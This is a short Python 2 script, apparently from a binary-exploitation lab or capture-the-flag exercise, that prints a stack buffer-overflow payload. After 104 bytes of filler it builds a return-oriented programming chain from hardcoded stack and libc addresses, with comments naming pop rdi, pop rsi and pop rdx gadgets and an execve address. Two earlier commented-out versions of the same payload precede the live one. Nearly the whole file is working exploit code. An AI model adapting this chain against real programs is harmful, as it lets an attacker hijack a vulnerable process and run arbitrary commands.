#!/bin/python2

# print("/usr/bin/ls" + "\x00" * 5 + \
#         "\x80\xe1\xff\xff\xff\x7f\x00\x00" + \
#         "\x00" * 8 + "A" * 96 + 8 * "B" + \
#         "\x35\x68\xdd\xf7\xff\x7f\x00\x00" + \
#         "\x80\xe1\xff\xff\xff\x7f\x00\x00" + \
#         "\x51\x81\xdd\xf7\xff\x7f\x00\x00" + \
#         "\x88\xe1\xff\xff\xff\x7f\x00\x00" + \
#         "\x49\x58\xe3\xf7\xff\x7f\x00\x00" + \
#         "\00" * 16 + \
#         "\x50\x5f\xe8\xf7\xff\x7f\x00\x00")

# print("/usr/bin/ls" + "\x00" * 5 + \ # bin/sh null terminated
#       "\x90\xe2\xff\xff\xff\x7f\x00\x00" + \ # buffer address
#       "\x00" * 8 + "A" * 104 + 8 * "B" + \ # NULL + filler (104) + filler pt RBP
#       "\x25\x67\xdf\xff\xff\x7f\x00\x00" + \ # pop rdi;
#       "\x90\xe2\xff\xff\xff\x7f\x00\x00" + \ # buffer address
#       "\xd9\x7e\xdf\xf7\xff\x7f\x00\x00" + \ # pop rsi;
#       "\x98\xe2\xff\xff\xff\x7f\x00\x00" + \ # buffer address + 8
#       "\x8d\xcc\xec\xf7\xff\x7f\x00\x00" + \ # pop rdx;
#       "\00" * 8 + \ # for rdx
#       "\xc0\x38\xea\xf7\xff\x7f\x00\x00") # execve address

print("/usr/bin/ls" + "\x00" * 5 + \
      "\x90\xe2\xff\xff\xff\x7f\x00\x00" + \
      "\x00" * 8 + "A" * 104 + 8 * "B" + \
      "\x25\x67\xdf\xff\xff\x7f\x00\x00" + \
      "\x90\xe2\xff\xff\xff\x7f\x00\x00" + \
      "\xd9\x7e\xdf\xf7\xff\x7f\x00\x00" + \
      "\x98\xe2\xff\xff\xff\x7f\x00\x00" + \
      "\x8d\xcc\xec\xf7\xff\x7f\x00\x00" + \
      "\00" * 8 + \
      "\xc0\x38\xea\xf7\xff\x7f\x00\x00")
